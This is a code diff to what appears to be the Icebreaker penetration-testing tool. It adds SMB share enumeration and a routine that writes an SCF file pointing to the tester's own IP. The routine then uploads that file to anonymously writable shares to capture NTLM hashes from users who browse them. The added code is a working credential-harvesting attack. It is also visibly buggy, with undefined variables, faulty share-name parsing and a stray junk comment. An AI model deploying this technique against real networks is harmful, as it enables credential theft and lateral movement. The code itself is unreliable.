@@ -14,6 +14,7 @@ import netifaces
 from datetime import datetime
 from itertools import zip_longest
 from libnmap.process import NmapProcess
+from smb.SMBConnection import SMBConnection
 from asyncio.subprocess import PIPE, STDOUT
 from netaddr import IPNetwork, AddrFormatError
 from libnmap.parser import NmapParser, NmapParserException
@@ -69,7 +70,7 @@ def nmap_scan(hosts):
     '''
     Do Nmap scan
     '''
-    nmap_args = '-sS --script smb-security-mode -n --max-retries 5 -p 445 -oA smb-scan'
+    nmap_args = '-sS --script smb-security-mode,smb-enum-shares -n --max-retries 5 -p 445 -oA smb-scan'
     nmap_proc = NmapProcess(targets=hosts, options=nmap_args, safe_mode=False)
     rc = nmap_proc.sudo_run_background()
     nmap_status_printer(nmap_proc)
@@ -88,8 +89,69 @@ def nmap_status_printer(nmap_proc):
         # Every 30 seconds print that Nmap is still running
         if i % 30 == 0:
             x += .5
-            print("[*] Nmap running: {} min".format(str(i)))
+            print("[*] Nmap running: {} min".format(str(x)))
         time.sleep(1)
+
+def create_scf():
+    '''
+    Creates scf file
+    '''
+    scf_data = '[Shell]\nCommand=2\nIconFile=\\\\{}\\file.ico\n[Taskbar]\nCommand=ToggleDesktop'.format(get_ip())
+    with open('submodules/@local.scf', 'w') as f:
+        f.write(scf_data)
+
+def parse_nse(host):
+    sec_run = False
+    enum_run = False
+    share_found = False
+    smb_signing_disabled_hosts = []
+
+    # Get SMB signing data
+    for script_out in host.scripts_results:
+        if script_out['id'] == 'smb-security-mode':
+            sec_run = True
+            if 'message_signing: disabled' in script_out['output']:
+                smb_signing_disabled_hosts.append(ip)
+
+        # Get READ/WRITE anonymous access shares
+        # Write an scf file to it
+        if script_out['id'] == 'smb-enum-shares':
+            enum_run = True
+            lines = script_out['output']
+            share_found = False
+
+            for l in lines:
+                if share_found == True:
+                    if 'Path: ' in line:
+                        path = line.split()[-1]
+                    if 'Anonymous access:' in line:
+                        create_scf()
+                        share_found = False
+                        access = l.split()[-1]
+                        if access == 'READ/WRITE':
+                            print('[+] Writable share found at: '+share)
+                            print('[*] Attempting to write SCF file to share')
+                            scf_file = open('submodules/@local.scf', 'rb')
+                            filename = '@local.scf'
+                            try:
+                                conn = SMBConnection('','','icebreaker','remote', is_direct_tcp=True)
+                                conn.connect(server, 445)
+                                shares = conn.listShares()
+                                for s in shares:
+                                    if s.name == share_name:
+                                        filesize = conn.storeFile(share_name, path+'\\'+filename, scf_file)  
+                                        print('[+] Uploaded {} bytes to {}'.format(filesize, share))
+                            except:
+                                print('[-] Failed to upload SCF file')
+                if l.startswith('  \\\\'):# and '$' not in l:  1111111111111
+                    share_found = True
+                    # remove semicolon at end of line
+                    share = l.strip()[:-1]
+                    server = share.split('\\')[2]
+                    share_name = share.split('\\')[2]
+
+    return sec_run, enum_run, smb_signing_disabled_hosts
+
 
 def get_hosts(args, report):
     '''
@@ -98,7 +160,6 @@ def get_hosts(args, report):
     '''
     hosts = []
     smb_signing_disabled_hosts = []
-    smb_script_run = False
 
     print('[*] Parsing hosts')
     for host in report.hosts:
@@ -108,26 +169,24 @@ def get_hosts(args, report):
                 if s.port == 445:
                     if s.state == 'open':
                         ip = host.address
-                        print('[+] SMB open: {}'.format(ip))
                         hosts.append(ip)
-            # Get SMB signing data
-            for script_out in host.scripts_results:
-                if script_out['id'] == 'smb-security-mode':
-                    smb_script_run = True
-                    if 'message_signing: disabled' in script_out['output']:
-                        smb_signing_disabled_hosts.append(ip)
+                        sec_run, enum_run, smb_signing_disabled_hosts = parse_nse(host)
 
     # If nmap user ran didn't do smb-security-mode script, do it now
     if args.xml:
         if len(hosts) > 0:
-            if smb_script_run == False:
-                print("[*] It appears the NSE script smb-security-mode was not run in your Nmap scan. Running it now")
+            if sec_run == False or enum_run == False:
+                print("[*] One or more NSE scripts (smb-security-mode and smb-enum-shares) were not run in your Nmap scan. Running them now")
                 report = nmap_scan(hosts)
-                hosts, smb_signing_disabled_hosts, smb_script_run = get_hosts(args, report)
+                hosts, smb_signing_disabled_hosts = get_hosts(args, report)
 
     if len(hosts) == 0:
         print('[-] No hosts were found with port 445 open')
-    return hosts, smb_signing_disabled_hosts, smb_script_run
+    else:
+        for h in hosts:
+            print('[+] SMB open: {}'.format(ip))
+
+    return hosts, smb_signing_disabled_hosts
 
 def coros_pool(worker_count, commands):
     '''
@@ -430,6 +489,11 @@ def get_iface():
 
     # Probably will only find 1 interface, but in case of more just use the first one
     return ifaces[0]
+
+def get_ip():
+    iface = get_iface()
+    ip = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']
+    return ip
 
 def run_proc(cmd):
     '''
@@ -800,7 +864,7 @@ def main(report, args):
     loop = asyncio.get_event_loop()
 
     # get_hosts will exit script if no hosts are found
-    hosts, smb_signing_disabled_hosts, smb_script_run = get_hosts(args, report)
+    hosts, smb_signing_disabled_hosts = get_hosts(args, report)
     if len(hosts) > 0:
         for host in smb_signing_disabled_hosts:
             write_to_file('smb-signing-disabled-hosts.txt', host+'\n')
